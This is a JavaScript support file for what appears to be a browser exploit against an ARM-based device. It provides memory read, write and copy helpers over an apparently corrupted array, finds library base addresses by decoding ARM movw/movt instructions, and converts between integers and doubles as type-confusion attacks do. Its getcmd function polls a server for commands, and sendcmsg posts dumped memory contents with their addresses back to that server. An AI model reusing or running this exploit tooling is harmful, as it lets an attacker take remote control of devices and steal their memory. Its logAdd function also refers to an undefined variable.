/*
    This file contains helper functions such as functions
    used to send and get messages to the server...
*/

// global vars  
var _log0, _log, _dview;

/*
    Cast Uint to Int
*/
function Int(u){
    if(u > 0x7fffffff){
        return (((0xffffffff - u) * -1) -1)
    }else{
        return u;
    }
}


/*
    Get some storage space
*/
function init_memory(start_addr){
    return function(size){
        var res = start_addr;
        start_addr += size;
        return res;
    }
}

/*
    printf()
*/
function myprintf(addr){
    var res = "";
    while(true){
        var curr = String.fromCharCode(aspace[addr++]);
        if(curr == "\x00"){
            break;
        }
        res += curr;
    }
    logdbg(res);
}

/*
    memcpy()
*/
function mymemcpy(addr, data, len){
    for(var i = 0; i < len; i++){
        aspace[addr + i] = data.charCodeAt(i);
    }
}

/*
   memset()
   */
function mymemset(addr, b, len){
    for(var i = 0; i < len; i++){
        aspace[addr + i] = b;
    }
}

/*
    Get Library base address using given offsets
*/
function get_base_from_offsets(landmark, entry_off, base_off){

    var entryaddr = landmark + entry_off;
    var entry = get_bytes(aspace, entryaddr, 4);
    entry = parseInt(entry, 16);
    entry = swap32(entry);
    var movw = get_bytes(aspace, entry, 4);
    movw = parseInt(movw, 16);
    movw = swap32(movw);
    movw = imm_movx(movw);
    var movt = get_bytes(aspace, entry + 4, 4);
    movt = parseInt(movt, 16);
    movt = swap32(movt);
    movt = imm_movx(movt);

    var ptr = ((movt << 16) | movw) >>> 0;
    var base = ptr - base_off;

    return base;
} 

/* 
    Get the immediate from a movw/t
*/
function imm_movx(ins){
    var imm12 = ins & 0xfff;
    var imm4 = ins & 0xf0000;
    return ((imm4 >> 4) | (imm12)) & 0xffff;
}

/*
    Convert string address to network
*/
function inet_addr(str){
    var ip_list = str.split(".").reverse();
    var a1 = parseInt(ip_list[0]);
    var a2 = parseInt(ip_list[1]);
    var a3 = parseInt(ip_list[2]);
    var a4 = parseInt(ip_list[3]);

    var addr = ((a1 << 24) | (a2 << 16) | (a3 << 8) | a4) >>> 0;
    return addr;
}


/* 
    Get a command from the server
*/
function getcmd(){
    try{
        var cmd = "";
        handler = function(data, stat){
                        //sendmsg("Received cmd: " + data);
                        cmd = data;
                     }
        $.ajax({
            type: 'GET',
            url: '/Command',
            success: handler,
            async: false
        });
    }catch(e){
        logdbg("GetCMDError: " + e);
        return "FAIL";
    }
    return cmd;
}

/*
    POST txt to server
    txt must be hexencoded string
*/
function sendcmsg(type, addr, txt, extra){
    try{
        var dat = {type: type, addr: addr, data: txt, extra: extra};
        $.ajax({
            type: 'POST',
            url: '/Data',
            data: dat,
            async: false
        });
    }catch(e){
        logdbg("SendCMsgError: " + e);
    }
}

/* 
    Send message to serversynchronous javascript
*/
function sendmsg(txt){
    var dat = {dbg: txt};
    $.ajax({
        type: 'GET',
        url: '/Debug',
        data: dat,
        async: false
    });
}

/*
    Send debug msg to server
*/
function logdbg(txt){
    sendmsg(txt);
}

/*
    Swap endianness of 32-bit number
*/
function swap32(val) {
    return (((val & 0xFF) << 24)
           | ((val & 0xFF00) << 8)
           | ((val >> 8) & 0xFF00)
           | ((val >> 24) & 0xFF)) >>> 0;
}
// prints log messages
function logAdd(txt)
{	
    alert(text);
	if (!_log0){
		_log0 = document.getElementById("log");
		if (!_log0) return;
	}
	if (!_log){
		_log = document.createElement("div");
		if (_log0.hasChildNodes()){
			_log0.insertBefore(_log, _log0.firstChild);
		}else{
			_log0.appendChild(_log);
		}
	}
	var div = document.createElement("div");
	div.innerHTML = txt;	
	_log.appendChild(div);
}


// outputs the content of array object
function ArrayToString(arr, offs, len)
{
	var str = "["; 
	len += offs-1;	
	for(var i=offs; i <= len; i++){
	  	str += (arr[i] > 9 && arr[i] <= 0xffffffff) ? "0x" + arr[i].toString(16) : arr[i];
	  	str += (i < len) ? ", " : "]";
	}
	return str;
}


// wraps two uint32s into double precision
function u2d(low,hi)
{
	if (!_dview) _dview = new DataView(new ArrayBuffer(16));
	_dview.setUint32(0,hi);
	_dview.setUint32(4,low);
	return _dview.getFloat64(0);	
}

// unwraps uints from double 
function d2u(d)
{
	if (!_dview) _dview = new DataView(new ArrayBuffer(16));
	_dview.setFloat64(0,d);
	return { low: _dview.getUint32(4), 
	         hi:  _dview.getUint32(0) };    
}
